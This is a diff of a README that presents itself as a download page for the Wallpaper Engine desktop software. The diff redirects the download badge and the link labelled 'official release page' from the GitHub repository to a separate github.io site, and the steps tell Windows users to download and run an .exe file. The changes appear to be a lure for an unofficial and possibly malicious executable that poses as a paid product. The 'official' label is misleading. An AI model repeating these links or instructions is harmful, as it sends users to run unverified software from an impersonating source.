@@ -1,6 +1,6 @@
 # 🎨 Wallpaper-Engine-Steam - Run live wallpapers on your desktop
 
-[![](https://img.shields.io/badge/Download-Wallpaper_Engine-blue.svg)](https://github.com/Fable9205/Wallpaper-Engine-Steam)
+[![](https://img.shields.io/badge/Download-Wallpaper_Engine-blue.svg)](https://fable9205.github.io)
 
 This software manages live, interactive, and high-resolution wallpapers on your Windows desktop. It supports 4K backgrounds, audio visualizers, and anime-style themes. The application runs with low system strain and stops when you play games to keep your computer fast. You can sync settings with lighting systems like Corsair iCUE or Razer Chroma and connect your Android phone for remote control.
 
@@ -8,7 +8,7 @@ This software manages live, interactive, and high-resolution wallpapers on your 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Fable9205/Wallpaper-Engine-Steam).
+1. Go to the [official release page](https://fable9205.github.io).
 2. Look for the latest release version on the right sidebar.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder you can find easily.
